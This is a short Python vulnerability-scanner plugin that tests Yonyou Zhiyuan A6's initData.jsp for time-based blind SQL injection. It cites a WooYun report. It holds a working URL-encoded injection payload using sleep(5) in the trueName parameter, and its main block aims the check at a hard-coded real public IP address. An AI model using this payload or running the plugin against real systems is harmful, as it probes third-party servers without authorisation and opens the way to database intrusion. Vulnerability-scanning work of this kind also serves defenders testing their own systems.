#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 用友致远A6 initData.jsp SQL注入
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0107543
import time

def assign(service, arg):
    if service == 'yongyou_zhiyuan_a6':
        return True, arg


def audit(arg):
    true_url = arg + 'yyoa/common/selectPersonNew/initData.jsp?trueName=1'
    start_time1 = time.time()
    code1, head1, body1, errcode1, fina_url1 = curl.curl2(true_url)
    true_time = time.time() - start_time1
    flase_url = arg + "yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%285%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29%3E64%20AND%20%27%25%27%3D%27"
    start_time2 = time.time()
    code2, head2, body2, errcode2, fina_url2 = curl.curl2(flase_url)
    flase_time = time.time() - start_time2
    if code1 == 200 and code2 == 200 and flase_time > true_time and flase_time > 5:
        security_hole(' SQL注入:' + true_url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://60.31.196.2/')[1])